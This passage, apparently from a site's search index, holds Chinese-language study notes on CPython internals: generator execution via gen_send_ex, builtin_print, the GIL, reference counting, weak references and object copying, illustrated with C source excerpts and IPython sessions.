<p>\u5f53\u6211\u4eec\u6bcf\u6b21\u5728Python\u4e2d\u8c03\u7528\u751f\u6210\u5668\u7684__next__\u65b9\u6cd5\u65f6\uff0c\u5176\u80cc\u540e\u7684gi_code\u5b57\u6bb5\u4f1a\u5728\u4e00\u4e2a\u65b0\u7684frame\u4e2d\u6267\u884c\uff0c\u5e76\u5c06\u8fd4\u56de\u503cpush\u5230\u503c\u6808\u4e2d\u3002\u5b83\u672c\u8d28\u4e0a\u8c03\u7528\u7684\u662fgen_send_ex()\u65b9\u6cd5\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u5c06\u751f\u6210\u5668\u5bf9\u8c61\u8f6c\u6362\u4e3a\u4e0b\u4e00\u4e2a\u4ea7\u751f\u7ed3\u679c\u7684\u51fd\u6570\uff0c\u5b83\u548c\u4e4b\u524d\u901a\u8fc7\u4ee3\u7801\u5bf9\u8c61\u6784\u9020frame\u6709\u5f88\u591a\u7c7b\u4f3c\u4e4b\u5904: <pre><code>static PyObject *\ngen_send_ex(PyGenObject *gen, PyObject *arg, int exc, int closing)\n{\n    // \u62ff\u5230\u5f53\u524d\u6267\u884c\u7ebf\u7a0b\n    PyThreadState *tstate = _PyThreadState_GET();       \n    PyFrameObject *f = gen-&gt;gi_frame;                   \n    PyObject *result;\n    // \u5982\u679c\u751f\u6210\u5668\u6b63\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u518d\u6b21\u8c03\u7528\u751f\u6210\u5668\u4f1a\u62a5\u9519\n    if (gen-&gt;gi_running) {     \n        const char *msg = \"generator already executing\";\n        if (PyCoro_CheckExact(gen)) {\n            msg = \"coroutine already executing\";\n        }\n        else if (PyAsyncGen_CheckExact(gen)) {\n            msg = \"async generator already executing\";\n        }\n        PyErr_SetString(PyExc_ValueError, msg);\n        return NULL;\n    }\n    // \u751f\u6210\u5668\u8fed\u4ee3\u5b8c\u7684\u60c5\u51b5\uff0c\u5bf9\u4e0d\u540c\u7684\u751f\u6210\u5668\u505a\u4e0d\u540c\u7684\u5904\u7406\n    if (f == NULL || f-&gt;f_stacktop == NULL) { \n        if (PyCoro_CheckExact(gen) &amp;&amp; !closing) {\n            PyErr_SetString(\n                PyExc_RuntimeError,\n                \"cannot reuse already awaited coroutine\"); // 4a.\n        }\n        else if (arg &amp;&amp; !exc) {\n            if (PyAsyncGen_CheckExact(gen)) {\n                PyErr_SetNone(PyExc_StopAsyncIteration); // 4b.\n            }\n            else {\n                PyErr_SetNone(PyExc_StopIteration);      // 4c.\n            }\n        }\n        return NULL;\n    }\n    // \u68c0\u67e5\u5e27\u7684\u6700\u540e\u4e00\u6761\u6307\u4ee4\u5982\u679c\u662f-1\n    if (f-&gt;f_lasti == -1) {\n        // \u6b64\u65f6\u4e0d\u80fd\u628a\u975eNone\u7684\u503c\u4f5c\u4e3a\u53c2\u6570\u4f20\u5165\n        if (arg &amp;&amp; arg != Py_None) { \n            const char *msg = \"can't send non-None value to a \"\n                              \"just-started generator\";\n            if (PyCoro_CheckExact(gen)) {\n                msg = NON_INIT_CORO_MSG;\n            }\n            else if (PyAsyncGen_CheckExact(gen)) {\n                msg = \"can't send non-None value to a \"\n                      \"just-started async generator\";\n            }\n            PyErr_SetString(PyExc_TypeError, msg);\n            return NULL;\n        }\n    } else { \n        // \u8fd9\u662f\u7b2c\u4e00\u6b21\u88ab\u8c03\u7528\uff0c\u5141\u8bb8\u4f7f\u7528\u53c2\u6570\uff0c\u53c2\u6570\u7684\u503c\u88abpush\u5230\u503c\u6808\u4e2d\n        result = arg ? arg : Py_None;\n        Py_INCREF(result);\n        *(f-&gt;f_stacktop++) = result;\n    }\n    Py_XINCREF(tstate-&gt;frame);\n    assert(f-&gt;f_back == NULL);\n    // f_back\u662f\u7528\u4e8e\u53d1\u9001\u8fd4\u56de\u503c\u7684\u8c03\u7528\u65b9\uff0c\u5728\u8fd9\u91cc\u628a\u5b83\u8bbe\u7f6e\u4e3a\u7ebf\u7a0b\u4e2d\u7684\u5f53\u524d\u5e27\uff0c\u4e5f\u5c31\u662f\u8fd4\u56de\u503c\u88ab\u53d1\u9001\u7ed9\u8c03\u7528\u8005\u800c\u4e0d\u662f\u751f\u6210\u5668\u7684\u521b\u5efa\u8005\n    f-&gt;f_back = tstate-&gt;frame;                          \n    // \u628a\u751f\u6210\u5668\u6807\u8bb0\u4e3a\u6b63\u5728\u8fd0\u884c\n    gen-&gt;gi_running = 1;            \n    // \u751f\u6210\u5668\u7684\u5f02\u5e38\u4fe1\u606f\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5f02\u5e38\uff0c\u4ece\u7ebf\u7a0b\u72b6\u6001\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5f02\u5e38\u590d\u5236                    \n    gen-&gt;gi_exc_state.previous_item = tstate-&gt;exc_info; \n    // \u7ebf\u7a0b\u72b6\u6001\u7684\u5f02\u5e38\u4fe1\u606f\u8bbe\u4e3a\u751f\u6210\u5668\u5f02\u5e38\u4fe1\u606f\u7684\u5730\u5740\uff0c\u4fbf\u4e8e\u8c03\u7528\u8005\u5728\u751f\u6210\u5668\u6267\u884c\u8fc7\u7a0b\u4e2d\u7684debug\n    tstate-&gt;exc_info = &amp;gen-&gt;gi_exc_state; \n    // \u751f\u6210\u5668\u5185\u90e8\u7684\u90a3\u4e2aframe\u653e\u5230CPython\u7684\u4e3b\u5faa\u73af\u4e2d\u53bb\u6267\u884c             \n    result = PyEval_EvalFrameEx(f, exc); \n    // \u628a\u7ebf\u7a0b\u72b6\u6001\u7684\u6700\u540e\u4e00\u4e2a\u5f02\u5e38\u91cd\u7f6e\u4e3a\u8c03\u7528frame\u4e4b\u524d\u7684\u503c               \n    tstate-&gt;exc_info = gen-&gt;gi_exc_state.previous_item; \n    gen-&gt;gi_exc_state.previous_item = NULL;    \n    // \u628a\u751f\u6210\u5668\u6807\u8bb0\u4e3a\u4e0d\u5728\u8fd0\u884c         \n    gen-&gt;gi_running = 0;                                \n    assert(f-&gt;f_back == tstate-&gt;frame);\n    Py_CLEAR(f-&gt;f_back);\n    //  \u6ca1\u6709\u8fd4\u56de\u503c\u65f6\uff0c\u5bf9\u4e8e\u751f\u6210\u5668\u5e94\u8be5\u5f15\u53d1StopIteration\uff0c\u5f02\u6b65\u751f\u6210\u5668\u5e94\u8be5\u5f15\u53d1StopAsyncIteration\n    if (result &amp;&amp; f-&gt;f_stacktop == NULL) {  \n        if (result == Py_None) {\n            if (PyAsyncGen_CheckExact(gen)) {\n                PyErr_SetNone(PyExc_StopAsyncIteration);\n            }\n            else {\n                PyErr_SetNone(PyExc_StopIteration);\n            }\n        }\n        else {\n            /* Async generators cannot return anything but None */\n            assert(!PyAsyncGen_CheckExact(gen));\n            _PyGen_SetStopIterationValue(result);\n        }\n        Py_CLEAR(result);\n    }\n    // \u5982\u679c\u8fd9\u662f\u4e00\u4e2a\u534f\u7a0b\u6216\u5f02\u6b65\u751f\u6210\u5668\u4f46\u5f15\u53d1\u4e86StopIteration\uff0c\u5219\u662f\u4e0d\u5141\u8bb8\u7684\uff0c\u5f15\u53d1RuntimeError\n    else if (!result &amp;&amp; PyErr_ExceptionMatches(PyExc_StopIteration)) { \n        const char *msg = \"generator raised StopIteration\";\n        if (PyCoro_CheckExact(gen)) {\n            msg = \"coroutine raised StopIteration\";\n        }\n        else if PyAsyncGen_CheckExact(gen) {\n            msg = \"async generator raised StopIteration\";\n        }\n        _PyErr_FormatFromCause(PyExc_RuntimeError, \"%s\", msg);\n    }\n    // \u5982\u679c\u8fd9\u662f\u4e00\u4e2a\u5f02\u6b65\u751f\u6210\u5668\u4f46\u5f15\u53d1\u4e86StopAsyncIteration\uff0c\u5219\u4e5f\u662f\u4e0d\u5141\u8bb8\u7684\uff0c\u5f15\u53d1RuntimeError\n    else if (!result &amp;&amp; PyAsyncGen_CheckExact(gen) &amp;&amp;\n             PyErr_ExceptionMatches(PyExc_StopAsyncIteration))  \n    {\n        /* code in `gen` raised a StopAsyncIteration error:\n           raise a RuntimeError.\n        */\n        const char *msg = \"async generator raised StopAsyncIteration\";\n        _PyErr_FormatFromCause(PyExc_RuntimeError, \"%s\", msg);\n    }\n...\n    // \u6700\u7ec8\uff0c\u7ed3\u679c\u8fd4\u56de\u7ed9\u8c03\u7528__next__()\u65b9\u6cd5\u8005\n    return result; \n}\n</code></pre></p> <p>\u7efc\u4e0a\uff0c\u751f\u6210\u5668\u662f\u4e00\u79cd\u5f3a\u5927\u7684\u8bed\u6cd5\uff0c\u901a\u8fc7yield\u5173\u952e\u5b57\u89e6\u53d1\u6574\u4e2a\u6d41\u7a0b\uff0c\u521b\u5efa\u552f\u4e00\u5bf9\u8c61\uff0c\u5c06\u5df2\u7f16\u8bd1\u7684\u4ee3\u7801\u5bf9\u8c61\u590d\u5236\u4e3a\u5176\u5c5e\u6027\uff0c\u8bbe\u7f6eframe\u5e76\u4e3a\u5176\u5b58\u50a8\u5c40\u90e8\u53d8\u91cf\u5217\u8868\u3002\u8fd9\u4e00\u5207\u5bf9\u7528\u6237\u770b\u8d77\u6765\u5f88\u795e\u5947\uff0c\u4f46\u5176\u5e95\u5c42\u5e76\u4e0d\u590d\u6742\u3002</p>"},{"location":"python/interpreter/#_18","title":"\u6807\u51c6\u5e93","text":"<p>Python\u88ab\u79f0\u4e3a\"\u5185\u7f6e\u7535\u6c60\"\u7684\u8bed\u8a00\uff0c\u4e3b\u8981\u5728\u4e8e\u5176\u5f3a\u5927\u7684\u6807\u51c6\u5e93\u6db5\u76d6\u4e86\u5404\u4e2a\u65b9\u9762\u3002\u5728CPython\u4e2d\uff0c\u4e3b\u8981\u5305\u542b\u4e24\u7c7b\u6807\u51c6\u5e93\u6a21\u5757\uff0c\u5373\u7528\u7eafPython\u7f16\u5199\u7684\u5b9e\u7528\u7a0b\u5e8f\uff0c\u4ee5\u53ca\u4f7f\u7528C\u5199\u7684\u3001Python\u53ea\u662f\u505a\u4e86\u4e00\u5c42\u5305\u88c5\u7684\u7a0b\u5e8f\u3002</p> <p>\u4f7f\u7528\u7eafPython\u5199\u7684\u6a21\u5757\u90fd\u653e\u5728Lib\u76ee\u5f55\u4e0b\uff0c\u5f53\u6211\u4eec\u5b89\u88c5\u4e00\u4e2aPython\u7684\u53d1\u884c\u7248\u65f6\uff0c\u6807\u51c6\u5e93\u6a21\u5757\u4f1a\u4eceLib\u6587\u4ef6\u5939\u590d\u5236\u5230\u53d1\u884c\u7248\u7684\u6587\u4ef6\u5939\u4e2d\u3002\u8fd9\u4e9b\u6a21\u5757\u5f80\u5f80\u6ca1\u6709\u4ec0\u4e48\u7279\u522b\u7684\uff0c\u6709\u7684\u751a\u81f3\u53ea\u6709\u51e0\u5341\u884c\uff0c\u53ea\u662f\u4e3a\u4e86\u5f00\u53d1\u8005\u7684\u65b9\u4fbf\u800c\u8bbe\u8ba1\u3002</p> <p>\u5176\u4f59\u7684\u6a21\u5757\u8981\u4e48\u662f\u7528C\u5199\u7684\uff0c\u8981\u4e48\u662f\u7528Python\u548cC\u7ed3\u5408\u8d77\u6765\u5199\u7684\u3002\u5b83\u4eecPython\u7684\u90e8\u5206\u4ecd\u7136\u5728Lib\u76ee\u5f55\u4e0b\uff0c\u800cC\u7684\u90e8\u5206\u5728Modules\u76ee\u5f55\u4e0b\u3002\u4f46\u662f\u6709\u4e24\u4e2a\u4f8b\u5916\uff0c\u5176\u4e00\u662fsys\u6a21\u5757\u5728Python/sysmodule.c\u4e2d\uff0c\u8fd8\u6709\u662f__builtins__\u6a21\u5757\u5728Python/bltinmodule.c\u4e2d\u3002</p> <p>\u6211\u4eec\u80fd\u5728Python\u4e2d\u76f4\u63a5\u4f7f\u7528\u7684print()\u3001chr()\u3001format()\u7b49\u65b9\u6cd5\u5c31\u662f\u5728bltinmodule.c\u4e2d\uff0c\u56e0\u4e3a\u89e3\u91ca\u5668\u5b9e\u4f8b\u5316\u7684\u65f6\u5019\u5c31\u901a\u8fc7import * from __builtins__\u5bfc\u5165\u4e86\u8fd9\u4e9b\u65b9\u6cd5\u3002sys\u6a21\u5757\u4e5f\u662f\u56e0\u4e3a\u4e13\u7528\u4e8e\u89e3\u91ca\u5668\u548cCPython\u5185\u90e8\u7684\uff0c\u624d\u653e\u5728\u90a3\u4e2a\u4f4d\u7f6e\u3002</p> <p>\u5f53\u6211\u4eec\u8f93\u5165<code>print(\"hello\")</code>\u65f6\uff0c\u5728CPython\u4e2d\u53d1\u751f\u4e86\u5982\u4e0b\u6b65\u9aa4:</p> <ol> <li>\u53c2\u6570hello\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\u5e38\u91cf\u88ab\u7f16\u8bd1\u5668\u8f6c\u6362\u4e3aPyUnicodeObject</li> <li>\u5185\u7f6e\u7684builtin_print()\u4f7f\u7528\u8be5\u53c2\u6570\u6267\u884c\uff0c\u6b64\u4f8b\u4e2dkwnames\u4e3aNULL</li> <li>\u53d8\u91cffile\u88ab\u8bbe\u4e3aPyId_stdout\uff0c\u7cfb\u7edf\u7684stdout\u5904\u7406\u5668</li> <li>\u628a\u6bcf\u4e00\u4e2a\u53c2\u6570\u53d1\u9001\u7ed9file</li> <li>\u628a<code>\\n</code>\u53d1\u9001\u7ed9file</li> </ol> <pre><code>static PyObject *\nbuiltin_print(PyObject *self, PyObject *const *args, Py_ssize_t nargs, PyObject *kwnames)\n{\n    ...\n    if (file == NULL || file == Py_None) {\n        file = _PySys_GetObjectId(&amp;PyId_stdout);\n        ...\n    }\n    ...\n    for (i = 0; i &lt; nargs; i++) {\n        if (i &gt; 0) {\n            if (sep == NULL)\n                err = PyFile_WriteString(\" \", file);\n            else\n                err = PyFile_WriteObject(sep, file,\n                                         Py_PRINT_RAW);\n            if (err)\n                return NULL;\n        }\n        err = PyFile_WriteObject(args[i], file, Py_PRINT_RAW);\n        if (err)\n            return NULL;\n    }\n    if (end == NULL)\n        err = PyFile_WriteString(\"\\n\", file);\n    else\n        err = PyFile_WriteObject(end, file, Py_PRINT_RAW);\n    ...\n    Py_RETURN_NONE;\n}\n</code></pre> <p>\u7528C\u6765\u7f16\u5199\u67d0\u4e9b\u6807\u51c6\u5e93\u662f\u56e0\u4e3a\u9700\u8981\u4f7f\u7528\u4e00\u4e9b\u64cd\u4f5c\u7cfb\u7edf\u7684\u529f\u80fd\uff0c\u800c\u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\u7684\u63a5\u53e3\u53ef\u80fd\u662f\u4e0d\u4e00\u6837\u7684\uff0cCPython\u9700\u8981\u628a\u5b83\u4eec\u62bd\u8c61\u4e3a\u7edf\u4e00\u7684API\u63a5\u53e3\u4f9b\u7528\u6237\u4f7f\u7528: <pre><code>#ifdef HAVE_SYS_TIMES_H\n#include &lt;sys/times.h&gt;\n#endif\n...\n#ifdef MS_WINDOWS\n#define WIN32_LEAN_AND_MEAN\n#include &lt;windows.h&gt;\n#include \"pythread.h\"\n#endif /* MS_WINDOWS */\n...\n</code></pre></p>"},{"location":"python/interpreter/#gil","title":"GIL","text":"<p>\u5168\u5c40\u89e3\u91ca\u5668\u9501\u673a\u5236\u4f7f\u5f97\u89e3\u91ca\u5668\u5728\u540c\u4e00\u65f6\u523b\u4ec5\u6709\u4e00\u4e2a\u7ebf\u7a0b\u53ef\u4ee5\u88ab\u8c03\u5ea6\u6267\u884c\uff0c\u67d0\u4e2a\u7ebf\u7a0b\u82e5\u60f3\u8981\u6267\u884c\uff0c\u5c31\u5148\u8981\u62ff\u5230GIL\uff0c\u4f46\u5728\u6bcf\u4e2aPython\u8fdb\u7a0b\u4e2d\uff0c\u53ea\u6709\u4e00\u4e2aGIL\u3002\u5b83\u7684\u5b58\u5728\u4f7f\u5f97\u89e3\u91ca\u5668\u672c\u8eab\u7684\u5b9e\u73b0\u66f4\u7b80\u5355\u4e00\u4e9b\uff0c\u66f4\u5bb9\u6613\u5b9e\u73b0\u5bf9\u8c61\u7684\u5b89\u5168\u8bbf\u95ee\uff0c\u4fbf\u4e8e\u8fdb\u884c\u5185\u5b58\u7ba1\u7406\u548c\u7f16\u5199\u6269\u5c55\u3002\u4f46\u5728\u591a\u6838\u73af\u5883\u4e0b\u65e0\u6cd5\u5b9e\u73b0\u5e76\u884c\uff0c\u5bf9\u4e8e\u4ee5\u591a\u7ebf\u7a0b\u4e3a\u57fa\u7840\u7684\u5e76\u53d1\u5e94\u7528\u5c31\u662f\u4e00\u4e2a\u707e\u96be\u3002</p> <p>\u5bf9\u4e8eIO\u5bc6\u96c6\u578b\u4efb\u52a1\uff0c\u7ebf\u7a0b\u662f\u5728\u53d1\u751f\u963b\u585e\u65f6\u4e3b\u52a8\u91ca\u653eGIL\u7684\uff0c\u8ba9\u5176\u4ed6\u7ebf\u7a0b\u5f97\u4ee5\u6267\u884c\u3002\u800c\u5bf9\u4e8eCPU\u5bc6\u96c6\u578b\u4efb\u52a1\uff0c\u91c7\u53d6\u8d85\u65f6\u7b56\u7565\u3002</p> <p>\u5f53GIL\u88ab\u5176\u4ed6\u7ebf\u7a0b\u5360\u7528\u65f6\uff0c\u7b49\u5f85\u7ebf\u7a0b\u4f1a\u963b\u585e\u4e00\u6bb5\u65f6\u95f4\u3002\u5982\u679c\u8d85\u65f6\uff08\u9ed8\u8ba4\u4e3a0.005\u79d2\uff09\u540e\uff0c\u4f9d\u7136\u65e0\u6cd5\u83b7\u53d6\u9501\uff0c\u5219\u53d1\u51fa\u8bf7\u6c42\u3002\u8fd9\u79cd\u8bf7\u6c42\u8bbe\u8ba1\u7684\u5f88\u8f7b\u5de7\uff0c\u5c31\u662f\u4e00\u4e2a\u5168\u5c40\u6761\u4ef6\u53d8\u91cf\u8bbe\u7f6e\u3002\u6b63\u5728\u6267\u884c\u7684\u7ebf\u7a0b\u5728\u89e3\u91ca\u5faa\u73af\u5185\u4f1a\u68c0\u67e5\u8be5\u6807\u8bb0\uff0c\u7136\u540e\u91ca\u653e\u9501\uff0c\u5207\u6362\u7ebf\u7a0b\u6267\u884c\uff0c\u5176\u81ea\u8eab\u8fdb\u5165\u7b49\u5f85\u72b6\u6001\u3002\u5c5e\u4e8e\u5178\u578b\u7684\u534f\u4f5c\u673a\u5236\u3002\u76f8\u5173\u6e90\u7801: cpython/Python/ceval.c<pre><code>main_loop:\n    for (;;) {\n        if (_Py_atomic_load_relaxed(eval_breaker)) {\n            opcode = _Py_OPCODE(*next_instr);\n            if (_Py_atomic_load_relaxed(&amp;ceval-&gt;gil_drop_request)) {\n                /* Give another thread a chance */\n                drop_gil(ceval, tstate);\n                /* Other threads may run now */\n                take_gil(ceval, tstate);\n                /* Check if we should make a quick exit. */\n                exit_thread_if_finalizing(tstate);\n                if (_PyThreadState_Swap(&amp;runtime-&gt;gilstate, tstate) != NULL) {\n                    Py_FatalError(\"ceval: orphan tstate\");\n                }\n            }\n        }\n        switch (opcode) {\n          case TARGET(NOP):\n          case TARGET(LOAD_FAST):\n          ...\n        }\n    }\n</code></pre> CPython\u4f7f\u7528\u7cfb\u7edf\u7ebf\u7a0b\uff0c\u4e14\u6ca1\u6709\u5b9e\u73b0\u7ebf\u7a0b\u8c03\u5ea6\u3002\u6240\u4ee5\uff0c\u5177\u4f53\u54ea\u4e2a\u7b49\u5f85\u7ebf\u7a0b\u88ab\u5207\u6362\u6267\u884c\uff0c\u7531\u64cd\u4f5c\u7cfb\u7edf\u51b3\u5b9a\u3002\u751a\u81f3\uff0c\u53d1\u51fa\u8bf7\u6c42\u548c\u88ab\u5207\u6362\u6267\u884c\u7684\u672a\u5fc5\u5c31\u662f\u540c\u4e00\u4e2a\u7ebf\u7a0b\u3002</p> <p>\u5bf9\u4e8eCPU\u5bc6\u96c6\u578b\u4efb\u52a1\uff0c\u9664\u4e86\u4f7f\u7528\u591a\u8fdb\u7a0b\u67b6\u6784\u7ed5\u5f00\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528C\u6765\u7f16\u5199\u591a\u7ebf\u7a0b\u7684\u6269\u5c55\u4e5f\u80fd\u7ed5\u5f00GIL\u9650\u5236\u3002</p>"},{"location":"python/memory/","title":"\u5185\u5b58\u7ba1\u7406","text":""},{"location":"python/memory/#_2","title":"\u5bf9\u8c61","text":"<p>\u5728Python\u4e2d\uff0c\u53d8\u91cf\u53ea\u662f\u4e00\u4e2a\u540d\u5b57\uff0c\u5e76\u4e0d\u610f\u5473\u7740\u5185\u5b58\u5730\u5740\u3002\u4e5f\u5c31\u662f\u8bf4\u5bf9\u4e8e<code>a=12345</code>\u8fd9\u6837\u4e00\u4e2a\u8868\u8fbe\u5f0f\u6765\u8bf4\uff0c\u5806\u4e0a\u6709\u4e00\u5757\u5185\u5b58\u533a\u57df\u5b58\u50a8\u4e86\u53d8\u91cf\u7684\u540d\u79f0<code>a</code>\uff0c\u5b83\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff1b\u8fd8\u6709\u4e00\u5757\u533a\u57df\u5b58\u50a8\u4e86<code>12345</code>\u8fd9\u4e2a\u5b9e\u9645\u7684\u5bf9\u8c61\uff1b\u8fd8\u6709\u4e00\u5757\u533a\u57df\u6211\u4eec\u79f0\u4e3a\u540d\u5b57\u7a7a\u95f4\uff0c\u5b83\u662f\u4e00\u4e2a\u5b57\u5178\uff0c\u5b58\u50a8\u4e86<code>a</code>\u548c<code>12345</code>\u5efa\u7acb\u7684\u6620\u5c04\u5173\u7cfb\u3002</p> <p>\u5bf9\u4e8e\u8fd9\u4e2a\u5b9e\u9645\u7684\u5bf9\u8c61\uff0c\u5b83\u53c8\u5206\u4e3a\u4e24\u90e8\u5206\uff0c\u5934\u90e8\u5b58\u50a8\u5143\u6570\u636e\uff0c\u5305\u62ec\u5b83\u7684\u5f15\u7528\u8ba1\u6570\uff0c\u4ee5\u53ca\u5b83\u662f\u4ec0\u4e48\u7c7b\u578b\u7684\uff1b\u800c\u6570\u636e\u90e8\u5206\u5bf9\u4e8e\u56fa\u5b9a\u957f\u5ea6\u7684\uff0c\u5219\u76f4\u63a5\u662f\u5b83\u7684\u6570\u636e\uff0c\u5bf9\u4e8e\u53ef\u53d8\u957f\u5ea6\u7684\uff0c\u5219\u9996\u5148\u6709\u4e00\u90e8\u5206\u63cf\u8ff0\u8be5\u5bf9\u8c61\u6709\u591a\u5c11\u4e2a\u5143\u7d20\u3002</p>"},{"location":"python/memory/#_3","title":"\u5f15\u7528","text":"<p>\u5f53\u6211\u4eec\u628a\u4e00\u4e2a\u53d8\u91cf\u8d4b\u503c\u7ed9\u53e6\u4e00\u4e2a\u53d8\u91cf\uff0c\u4f20\u9012\u7684\u662f\u5b9e\u9645\u5bf9\u8c61\u7684\u5f15\u7528\uff0cpython\u603b\u662f\u6309\u5f15\u7528\u4f20\u9012\u7684\uff0c\u5305\u62ec\u51fd\u6570\u7684\u53c2\u6570\u4e5f\u662f: <pre><code>In [1]: a=12345\nIn [2]: def test(x):\n   ...:     return x is a\nIn [3]: test(a)\nOut[3]: True\n</code></pre> \u800c\u50cfGo\u3001C\u8fd9\u6837\u7684\u8bed\u8a00\uff0c\u603b\u662f\u4f1a\u6309\u503c\u4f20\u9012\uff0c\u4e5f\u5c31\u662f\u8bf4\u4e0d\u7ba1\u662f\u628a\u4e00\u4e2a\u53d8\u91cf\u8d4b\u503c\u7ed9\u53e6\u4e00\u4e2a\u53d8\u91cf\uff0c\u8fd8\u662f\u51fd\u6570\u4f20\u53c2\uff0c\u90fd\u4f1a\u628a\u8fd9\u4e2a\u5b9e\u9645\u7684\u5bf9\u8c61<code>12345</code>\u590d\u5236\u4e00\u4efd\u3002</p> <p>\u5bf9\u4e8e<code>del a</code>\u8fd9\u6837\u7684\u8bed\u53e5\uff0c\u53ea\u662f\u628a<code>a</code>\u548c<code>12345</code>\u8fd9\u4e2a\u6620\u5c04\u5173\u7cfb\u89e3\u9664\uff0c\u5e76\u628a<code>12345</code>\u7684\u5f15\u7528\u8ba1\u6570\u51cf\u4e00\uff0c\u5f53<code>12345</code>\u7684\u5f15\u7528\u8ba1\u6570\u4e3a0\u65f6\u5b83\u4f1a\u81ea\u52a8\u88ab\u5783\u573e\u56de\u6536\u5668\u56de\u6536\u3002\u4f7f\u7528<code>sys.getrefcount(a)</code>\u8fd9\u4e2a\u51fd\u6570\u4f1a\u5f97\u5230a\u5bf9\u5e94\u7684\u5b9e\u9645\u5bf9\u8c61\u7684\u5f15\u7528\u8ba1\u6570\uff0c\u4f46\u5b83\u603b\u4f1a\u6bd4\u5b9e\u9645\u7684\u8ba1\u6570\u591a1\uff0c\u56e0\u4e3a\u5b83\u672c\u8eab\u4e5f\u4f20\u5165\u4e86a\u4e3a\u53c2\u6570\u3002</p>"},{"location":"python/memory/#_4","title":"\u5f31\u5f15\u7528","text":"<p>\u540d\u5b57\u548c\u5bf9\u8c61\u4e4b\u95f4\u7684\u5f3a\u5f15\u7528\u5173\u7cfb\u5f71\u54cd\u4e86\u5bf9\u8c61\u7684\u751f\u547d\u5468\u671f\uff0c\u4f46\u6709\u65f6\u6211\u4eec\u5e0c\u671b\u80fd\u4ee5\"\u8def\u4eba\u7532\"\u7684\u8eab\u4efd\u8fdb\u884c\u4e00\u4e9b\u89c2\u5bdf\u3001\u65e5\u5fd7\u3001\u76d1\u6d4b\u7b49\uff0c\u65e2\u80fd\u591f\u89c2\u5bdf\u5230\u76ee\u6807\u7684\u72b6\u6001\uff0c\u53c8\u4e0d\u4f1a\u5e72\u6270\u5230\u5176\u88ab\u56de\u6536\u3002\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u9700\u8981\u7528\u5f31\u5f15\u7528\u3002 <pre><code>In [1]: import weakref\nIn [2]: class X:\n   ...:     def __del__(self):\n   ...:         print(\"in del real obj\")\n   ...:     def test(self):\n   ...:         print(\"X.test\")\nIn [3]: o = X()             # \u521b\u5efa\u5b9e\u4f8b\nIn [4]: w = weakref.ref(o)  # \u4e3a\u8be5\u5b9e\u4f8b\u521b\u5efa\u5f31\u5f15\u7528\nIn [5]: w() is o            # \u901a\u8fc7\u5f31\u5f15\u7528\u5f15\u7528\u76ee\u6807\nOut[5]: True\nIn [6]: w().test()          # \u57fa\u4e8e\u5f31\u5f15\u7528\u8fdb\u884c\u65b9\u6cd5\u8c03\u7528\nX.test\nIn [7]: del o               # \u5f31\u5f15\u7528\u4e0d\u5f71\u54cd\u76ee\u6807\u88ab\u56de\u6536\nin del real obj\nIn [8]: w() is None         # \u76ee\u6807\u88ab\u56de\u6536\u540e\u5f31\u5f15\u7528\u4e0d\u518d\u5f15\u7528\nOut[8]: True\n</code></pre> \u8fd8\u6709\u4e00\u79cd\u4ee3\u7406\u7684\u65b9\u5f0f\uff0c\u5b83\u770b\u4e0a\u53bb\u4f1a\u548c\u539f\u672c\u7684\u8c03\u7528\u65b9\u5f0f\u66f4\u7c7b\u4f3c\u4e00\u4e9b\uff0c\u5b83\u5185\u90e8\u4f1a\u505a\u4e00\u4e9b\u5305\u88c5\u5904\u7406\uff0c\u4f46\u901a\u8fc7\u5b83\u5f88\u96be\u627e\u5230\u539f\u672c\u7684\u5bf9\u8c61\u3002 <pre><code>In [10]: o = X()\nIn [11]: p = weakref.proxy(o)   # \u4e3a\u8be5\u5b9e\u4f8b\u521b\u5efa\u4ee3\u7406\nIn [12]: p.test()               # \u901a\u8fc7\u4ee3\u7406\u53ef\u76f4\u63a5\u8c03\u7528\u5b9e\u4f8b\u7684\u65b9\u6cd5\nX.test\nIn [13]: p is o                 # \u4f46\u4ee3\u7406\u4e0d\u662f\u539f\u5bf9\u8c61\nOut[13]: False\nIn [14]: p.test.__self__ is o   # \u53ef\u4ee5\u66f2\u6298\u7684\u627e\u5230\u539f\u5bf9\u8c61\nOut[14]: True\n</code></pre></p>"},{"location":"python/memory/#_5","title":"\u590d\u5236","text":"<p>\u6709\u65f6\u5019\uff0c\u5bf9\u4e8e\u53ef\u53d8\u5bf9\u8c61\uff0c\u6211\u4eec\u66f4\u559c\u6b22\u9009\u62e9\u503c\u4f20\u9012\u7684\u65b9\u5f0f\uff0c\u56e0\u4e3a\u514b\u9686\u4f53\u65e0\u8bba\u600e\u4e48\u6298\u817e\uff0c\u90fd\u4e0d\u4f1a\u5f71\u54cd\u5230\u539f\u6765\u7684\u5bf9\u8c61\u3002\u8fd9\u65f6\u5019\u5c31\u9700\u8981\u590d\u5236\u5bf9\u8c61\uff0c\u53c8\u5206\u4e3a\u6d45\u62f7\u8d1d(shallow copy)\u548c\u6df1\u5ea6\u62f7\u8d1d(deep copy)\u4e24\u79cd\uff0c\u524d\u8005\u53ea\u590d\u5236\u5bf9\u8c61\u81ea\u8eab\uff0c\u4e0d\u5305\u62ec\u5b83\u5f15\u7528\u7684\u5176\u4ed6\u5bf9\u8c61\uff0c\u540e\u8005\u5219\u9012\u5f52\u590d\u5236\u6240\u6709\u5f15\u7528\u76ee\u6807\u3002 <pre><code>In [1]: class X: pass\nIn [2]: x = X()\nIn [3]: x.data = [1,2,3]\nIn [4]: import copy\nIn [5]: x1 = copy.copy(x)\nIn [6]: x2 = copy.deepcopy(x)\nIn [7]: x1 is x\nOut[7]: False\nIn [8]: x2 is x\nOut[8]: False\nIn [9]: x1.data is x.data       # \u6d45\u62f7\u8d1d\u4e0d\u5305\u62ec\u6240\u5f15\u7528\u7684\u76ee\u6807\nOut[9]: True\nIn [10]: x2.data is x.data      # \u6df1\u62f7\u8d1d\u8fde\u540c\u5f15\u7528\u76ee\u6807\u4e5f\u88ab\u590d\u5236\nOut[10]: False\n</code></pre> 